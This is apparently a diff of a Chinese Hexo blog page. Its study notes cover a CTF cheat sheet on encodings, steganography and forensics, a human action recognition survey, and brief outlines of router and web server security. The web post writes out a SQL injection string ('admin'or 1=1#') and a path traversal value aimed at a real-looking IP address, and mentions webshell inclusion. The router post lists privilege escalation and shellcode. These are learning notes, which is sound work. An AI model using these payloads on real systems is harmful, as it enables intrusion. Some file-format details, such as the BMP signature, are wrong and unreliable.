-<li>字符对应ASCII转换成八位二进制</li>
-<li>base64的基础单位是 3<em>8bit的二进制，若是不够3</em>8bit则在后面添加0字节（padding）直至满足</li>
-<li>3<em>8bit的二进制转换成4</em>6bit的二进制</li>
-<li>4*6bit的二进制转换成十进制</li>
-<li>对照base64表把十进制转换成字符</li>
-</ul>
-<p>解码方式:</p>
-<ul>
-<li>检查base64编码后面有几个等于号</li>
-<li>把字符串按照base64表转换成4*6的倍数位数二进制</li>
-<li>删除等于号的个数*8的bit</li>
-<li>按照6个bit一组转成字符</li>
-<li>可以发现，编码和解码的方式并非完全对称的，解码的时候直接根据等号的数量删除bit,如果我们把数据写到填充的0的前两位，那么就可以实现隐写的功能。</li>
-</ul>
-<p>判断方法: 先解码在编码，和原字符串对比，若不一样就是有隐写</p>
-<ul>
-<li><a href="http://www.atool.org(编码工具集)" target="_blank" rel="noopener">www.atool.org(编码工具集)</a></li>
-<li><a href="http://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章)" target="_blank" rel="noopener">www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章)</a></li>
-</ul>
-<h4 id="图形码"><a href="#图形码" class="headerlink" title="图形码"></a>图形码</h4><p>条形码,二维码。</p>
-<h4 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted printable"></a>Quoted printable</h4><p>用等号隔开</p>
-<h4 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h4><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
-<h4 id="JSfuck"><a href="#JSfuck" class="headerlink" title="JSfuck"></a>JSfuck</h4><p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a><br>可以直接扔到浏览器里运行</p>
-<p>####代码混淆<br>明显，在线解码</p>
-<h4 id="工具小结"><a href="#工具小结" class="headerlink" title="工具小结"></a>工具小结</h4><p><a href="http://tool.ph0en1x.com/hashtool/tools.html#conv" target="_blank" rel="noopener">http://tool.ph0en1x.com/hashtool/tools.html#conv</a><br>JPK<br>CTFCrack</p>
-<h2 id="Forensic-amp-Stego"><a href="#Forensic-amp-Stego" class="headerlink" title="Forensic &amp; Stego"></a>Forensic &amp; Stego</h2><ul>
-<li>取证对象：各种数据包PCAP,图像，音频，压缩包，磁盘，内存镜像，PDF,word</li>
-<li>目的：发现文件隐藏的字符串，通常有文件的修复,字符串常常又与隐写加密结合在一起</li>
-<li>&lt;&lt;黑客大追踪&gt;&gt;</li>
-<li>熟悉常用文件的文件头。</li>
-</ul>
-<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul>
-<li>file</li>
-<li>strings</li>
-<li>diff</li>
-<li>binwalk,foremost<ul>
-<li>binwalk -e<br>拓展提高：<a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/15266.html</a></li>
-</ul>
-</li>
-<li>010ditor<br>分析文件16进制,强大的模板功能</li>
-</ul>
-<h3 id="图片："><a href="#图片：" class="headerlink" title="图片："></a>图片：</h3><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>特征：以 FF D8 开头，以 FF D9 结尾。<br>格式：标记码+压缩数据<br>标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值<br>压缩数据：前两个字节保存整个段的长度，包括这两个字节<br>隐写方式：利用文件格式隐藏信息，插入法</p>
-<ul>
-<li>文件尾部插入<br>储存在APP1数据区中<br>工具：MagicEXIF</li>
-<li>每段开始前<br>COM注释：<br>FF 开始标记<br>FE COM注释标记符<br>00 02 总长度 11 内容<br>工具:stegdetect 检测隐写工具</li>
-</ul>
-<h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>特征：以89 50 4E 47 开头。<br>格式:PNG文件署名域+标准数据块(+辅助数据块)<br>隐写方式:</p>
-<ul>
-<li><p>IDAT 隐藏数据:PNG图片中可以存在多个IDAT块 因此这也成了一个隐写的途径</p>
-</li>
-<li><p>修改PNG图片的高度,隐藏数据</p>
-</li>
-<li><p>双图</p>
-<p>​</p>
-<p>工具:pngcheck</p>
-<p>​</p>
-<p>#####pngcheck</p>
-<h5 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h5><p>stegsolve:必备</p>
-<p>​</p>
-<p>位平面对图像的影响不一样，可以隐写到不是很重要的位平面。</p>
-</li>
-</ul>
-<h4 id="BMP-文件格式"><a href="#BMP-文件格式" class="headerlink" title="BMP 文件格式"></a>BMP 文件格式</h4><p>特征是以 50 4B 03 04 开头，有时也会出现 50 4B 05 06 和 50 4B 07 08 的情况。</p>
-<h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>特征：以 GIF89a 或 GIF87a 开头。</p>
-<ul>
-<li>文件格式</li>
-<li>空间</li>
-<li>时间轴 identity命令 //、linux上的identify命令主要用于获取一个或多个图像文件的格式和特性。</li>
-<li>思路：</li>
-</ul>
-<h3 id="压缩文件："><a href="#压缩文件：" class="headerlink" title="压缩文件："></a>压缩文件：</h3><h4 id="zip文件格式"><a href="#zip文件格式" class="headerlink" title="zip文件格式"></a>zip文件格式</h4><ul>
-<li>压缩源文件数据区<br>• 文件头 ： PK开头<br>• 文件数据<br>• （数据描述符）</li>
-<li>思路：<ul>
-<li>文件格式</li>
-<li>CRC32爆破：有时候加密的文件很小，直接枚举数据的CRC32值，如果相同，就相当于知道了文件的内容</li>
-<li>伪加密</li>
-<li>已知明文攻击</li>
-</ul>
-</li>
-<li>目录结束标识</li>
-</ul>
-<h4 id="RAR-文件"><a href="#RAR-文件" class="headerlink" title="RAR 文件"></a>RAR 文件</h4><p>特征：以以 Rar! 开头。</p>
-<h3 id="流量分析-重要"><a href="#流量分析-重要" class="headerlink" title="流量分析(重要)"></a>流量分析(重要)</h3><ul>
-<li><p>文件修复</p>
-</li>
-<li><p>协议分析<br>• 总体把握（整体分析）</p>
-<ul>
-<li><p>协议分级</p>
-</li>
-<li><p>端点统计</p>
-<p>• 过滤赛选</p>
-</li>
-<li><p>过滤语法</p>
-</li>
-<li><p>Host，Protocol，contains，特征值</p>
-<p>• 发现异常</p>
-</li>
-<li><p>特殊字符串</p>
-</li>
-<li><p>协议某字段</p>
-<p>• 数据提取</p>
-</li>
-<li><p>字符串取</p>
-</li>
-<li><p>文件提取</p>
-</li>
-</ul>
-</li>
-<li><p>数据提取</p>
-<ul>
-<li>Wireshark</li>
-<li>Pcapfix //修复数据包</li>
-<li>Dshell(强大)</li>
-<li>tshark（wireshark命令行版本）<br>命令:1. tr，2.xxd</li>
-</ul>
-</li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="音频文件"><a href="#音频文件" class="headerlink" title="音频文件"></a>音频文件</h4><ul>
-<li>频谱<br>有可能是在高频上，需要进行拉伸。(Rctf 2017)</li>
-<li>波形</li>
-<li>隐写软件：MP3Stego,Slienteye</li>
-</ul>
-<h4 id="视频类"><a href="#视频类" class="headerlink" title="视频类"></a>视频类</h4><p>AVI，MP4较为常见</p>
-<ul>
-<li>工具：<ul>
-<li>Ffmpeg：BCTF2016-catvideo</li>
-<li>Ourstrect</li>
-</ul>
-</li>
-</ul>
-<h4 id="HTML隐写"><a href="#HTML隐写" class="headerlink" title="HTML隐写"></a>HTML隐写</h4><p>Snow.exe：通过插入制表位与空格使得嵌入的数据在浏览器中不可见<br><a href="http://fog.misty.com/perry/ccs/snow/snow/" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/</a></p>
-<h4 id="PYC文件类"><a href="#PYC文件类" class="headerlink" title="PYC文件类"></a>PYC文件类</h4><p>字节码修复,隐写，逆向分析。</p>
-<ul>
-<li>Tools<ul>
-<li>pycdc</li>
-<li>uncompyle</li>
-<li><a href="http://unpyc.sourceforge.net/Opcodes.html/" target="_blank" rel="noopener">http://unpyc.sourceforge.net/Opcodes.html\</a></li>
-<li>Stegosaurus 隐写</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3.6 stegosaurus.py  5061c764-2ac4-4386-afd0-2f7a69139efa.pyc -x</span><br><span class="line">Extracted payload: Flag&#123;HiD3_Pal0ad_1n_Python&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/sectool/129357.html</span><br></pre></td></tr></table></figure>
-<h3 id="固件分析类（国内少）"><a href="#固件分析类（国内少）" class="headerlink" title="固件分析类（国内少）"></a>固件分析类（国内少）</h3><h4 id="Pro类"><a href="#Pro类" class="headerlink" title="Pro类"></a>Pro类</h4><ul>
-<li>Python模拟输入</li>
-<li>爆破</li>
-<li>算法</li>
-</ul>
-<h2 id="安卓逆向分析"><a href="#安卓逆向分析" class="headerlink" title="安卓逆向分析"></a>安卓逆向分析</h2><p>调试:</p>
-<ul>
-<li>IDA Pro</li>
-<li>GDB</li>
-</ul>
-<p>-angr<br>Hook:</p>
-<ul>
-<li>Xposed</li>
-<li>Frida（important）</li>
-</ul>
-<p>java层：</p>
-<ul>
-<li>java-&gt;jvm字节码-&gt;dalvik字节码(javac,dx)</li>
-<li>dex-&gt;smali(baksmaili)</li>
-<li>dex-&gt;smali,伪java(jeb)</li>
-<li>dex-&gt;java字节码(dex2jar)</li>
-<li>java字节码-&gt;伪java(jd-gui)</li>
-</ul>
-<p>native层:<br>IDA</p>
-<h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>C/C++源码<br>混淆工具</p>
-<ul>
-<li>LLVM-Obfuscator</li>
-<li>CXX-Obfuscator</li>
-</ul>
-<p>混淆技术</p>
-<ul>
-<li>指令替换</li>
-<li>伪造控制流</li>
-<li>扁平化控制流</li>
-</ul>
-<h3 id="隐藏与取证"><a href="#隐藏与取证" class="headerlink" title="隐藏与取证"></a>隐藏与取证</h3><h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h3><h3 id="取证技术"><a href="#取证技术" class="headerlink" title="取证技术"></a>取证技术</h3>
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-行为识别"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/08/05/行为识别/">人体行为识别</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/08/05/行为识别/" class="article-date">
-	  <time datetime="2017-08-05T15:53:56.000Z" itemprop="datePublished">2017-08-05</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="人体行为识别"><a href="#人体行为识别" class="headerlink" title="人体行为识别"></a>人体行为识别</h1><p>空间复杂度，时间复杂度。</p>
-<p>1）将人体动作行为识别划分为几个相互联系的子过程， 根据过程划分方式的不同对相应技术进行分析分类;</p>
-<p>2) 典型问题方式，即选取人体动作行为识别中的部分典型问题作为对象，针对这些对象研究中涉及的方法进行分析<br>分类;<br>3) 空间时域方式， 即根据时域和空间上各项<br>研究方法的差别对相应技术进行分析分类．  </p>
-<h2 id="传统行为识别"><a href="#传统行为识别" class="headerlink" title="传统行为识别"></a>传统行为识别</h2><p>运动目标检测：</p>
-<ol>
-<li>图像分割</li>
-</ol>
-<ul>
-<li>基于区域的方法，基于边界的方法和数学形态学方法。其中， 基于区域的方法又分为阈值分割法，区域生长法和区域分裂合并法。</li>
-</ul>
-<ol start="2">
-<li>人体动作识别研究对于人体区进行分割</li>
-</ol>
-<ul>
-<li>直接利用或结合图像分割法对于人体区域分割</li>
-<li>构建人体模型–》结合图像分割方法通过人体区域进行分割</li>
-</ul>
-<h2 id="动作分割"><a href="#动作分割" class="headerlink" title="动作分割"></a>动作分割</h2><p> 局部分割法选取部分动作序列作为分析目标或<br>提取局部特征以实现整个行为的分割． 边界检测法<br>是一种常用而经典的局部动作分割方法。</p>
-<p>人体动作数据库</p>
-<h2 id="动作特征提取"><a href="#动作特征提取" class="headerlink" title="动作特征提取"></a>动作特征提取</h2><ol>
-<li><p>第一种是基于<strong>图像局部特征检测</strong>的方法。<br>例如有些学者使用方向梯度直方图<br>或尺度不变检测子来提取视频中的<strong>形状信息</strong>， 并 用 光 流 直 方 图（ ＨＯＦ） 或 运 动边界直 方 图 （ ＭＢＨ） 特 征 提 取 视 频 中 的 运动信息，然后用词包的形式进行编码， 并 训 练 分<br>类器识别人体行为。然而这种获取行为识别特<br>征的方法是将视频图像中提取的局部特征通过手<br>工制造得到高维的特征， 因此针对性较强， 通用性<br>较差。</p>
-</li>
-<li><p>有一些学者通过<strong>构建多级体系结构分级 </strong>进 行 行 为 识 别， 例 如 有 些 算 法 采 用 第一级结构对视频进行多种时空分割并得到所有可能的包含人体区域的分割结果， 再在第二级中利用时空信息对分割结果进行推理， 从而获得有效的人体行为特征。虽然这种分层级的方法能够更好地融合时间与空间信息， 但在每个层级中的处<br>理仍然依赖于手工制造的特征</p>
-</li>
-</ol>
-<ol start="3">
-<li>有一些学 者 提 出 使 用 <strong>深 度 神 经 网 络 进 行 行 为 识别</strong>，例 如 有 学 者 提 出 使 用 卷 积 神 经 网 络<strong>获取视频的表观特征与运动特征并将得到的特征进行分 析 与融 合</strong>，从 而 获 得 有 效的 行 为 识 别 特征。</li>
-</ol>
-<p>传统的方式      <strong>模板匹配</strong>  <strong>状态空间法</strong><br>法<br>特征提取和分类这两个步骤完成:</p>
-<ul>
-<li>首先是进行特征提取，常见的<br>特征包括 LBP ( Local Binary Patterns) ， SIFT ( Scale-Invariant<br>Feature Transform) 和 HOG( Histogram of Oriented Gradients)<br>等;</li>
-<li>分类则采用 SVM( Support Vector Machine) 和贝叶斯等机<br>器学习中常用的分类器． </li>
-</ul>
-<h2 id="行为识别–机器学习"><a href="#行为识别–机器学习" class="headerlink" title="行为识别–机器学习"></a>行为识别–机器学习</h2><p>参考：<a href="http://blog.sina.com.cn/s/blog_4caedc7a0102wrkz.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4caedc7a0102wrkz.html</a></p>
-<p>人体特征值提取: 人体骨架—人体关键点(Skeleton) </p>
-<ol>
-<li>通过RGB图像进行关节点估计（Pose Estimation）获得。</li>
-<li>是通过深度摄像机直接获得（例如Kinect）。每一时刻（帧）骨架对应人体的K个关节点所在的坐标位置信息，一个时间序列由若干帧组成。行为识别就是对时域预先分割好的序列判定其所属行为动作的类型，即“读懂行为”。但在现实应用中更容易遇到的情况是序列尚未在时域分割（Untrimmed），因此需要同时对行为动作进行时域定位（分割）和类型判定，这类任务一般称为行为检测。</li>
-<li>主要问题：一方面是如何设计鲁棒和有强判别性的特征，另一方面是如何利用时域相关性来对行为动作的动态变化进行建模。</li>
-<li></li>
-</ol>
-<p>LSTM（Long-Short Term Memory）和循环神经系统（RNN）来搭建基础框架。</p>
-<p>基于 ＣＮＮ 的时空轨迹特征提取方法</p>
-<p>基于骨架序列的行为识别      </p>
-<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p><a href="http://blog.csdn.net/qq_36165459/article/details/78332172" target="_blank" rel="noopener">http://blog.csdn.net/qq_36165459/article/details/78332172</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-路由器安全"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/07/29/路由器安全/">家用路由器安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/07/29/路由器安全/" class="article-date">
-	  <time datetime="2017-07-29T15:53:56.000Z" itemprop="datePublished">2017-07-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="家用路由器安全"><a href="#家用路由器安全" class="headerlink" title="家用路由器安全"></a>家用路由器安全</h1><p><a href="http://shackles.top/2017/08/09/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/"> 2017-08-09</a></p>
-<h3 id="路由器安全"><a href="#路由器安全" class="headerlink" title="路由器安全"></a>路由器安全</h3><h3 id="CGI-程运行"><a href="#CGI-程运行" class="headerlink" title="CGI 程运行"></a>CGI 程运行</h3><ol>
-<li>请求处理：客户端http请求 http server CGI</li>
-<li>CGI程序返回结果</li>
-<li>攻击CGI 程序<ol>
-<li>在同一个请求中无法进行多次交互；</li>
-</ol>
-</li>
-<li>binwak</li>
-<li>漏洞利用<ol>
-<li>busybox 提权</li>
-<li>自己编译shellcode</li>
-<li>sleep(1)​</li>
-</ol>
-</li>
-<li>路由器web漏洞<ol>
-<li>xss</li>
-<li>csrf</li>
-<li>认证漏洞</li>
-<li>命令注入</li>
-<li>lua</li>
-</ol>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/物联网安全/">物联网安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Web 服务端安全"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/06/29/Web 服务端安全/">Web 服务端安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/06/29/Web 服务端安全/" class="article-date">
-	  <time datetime="2017-06-29T15:53:56.000Z" itemprop="datePublished">2017-06-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Web-服务端安全"><a href="#Web-服务端安全" class="headerlink" title="Web 服务端安全"></a>Web 服务端安全</h1><p><a href="http://shackles.top/2016/10/05/Web%20%E6%9C%8D%E5%8A%A1%E7%AB%AF/"> 2016-10-05</a></p>
-<h3 id="Web-服务端"><a href="#Web-服务端" class="headerlink" title="Web 服务端"></a>Web 服务端</h3><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>web服务端 逆向的过程；</p>
-<h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><p>1.$user=admin’or 1=1#</p>
-<ol>
-<li>Union 注入<ol>
-<li>有回显</li>
-<li>猜解出来字段</li>
-<li>可以填充查询结果</li>
-</ol>
-</li>
-<li>数据库报错；</li>
-<li>Boolean 盲注（在木有数据回显）<ol>
-<li>Timing 盲注<br>2 if（1，name，price）</li>
-</ol>
-</li>
-</ol>
-<p>if(select(flag)，name，price）</p>
-<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><ol>
-<li>读取敏感文件</li>
-<li>包含一句话getshell</li>
-<li>创建临时文件</li>
-<li>​</li>
-</ol>
-<p><a href="http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip" target="_blank" rel="noopener">http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip</a></p>
-<p>123‘’,../../../../../../../etc/password#</p>
-<p><a href="https://zhuanlan.zhihu.com/p/26308699" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26308699</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
 
     </footer>
   </div>
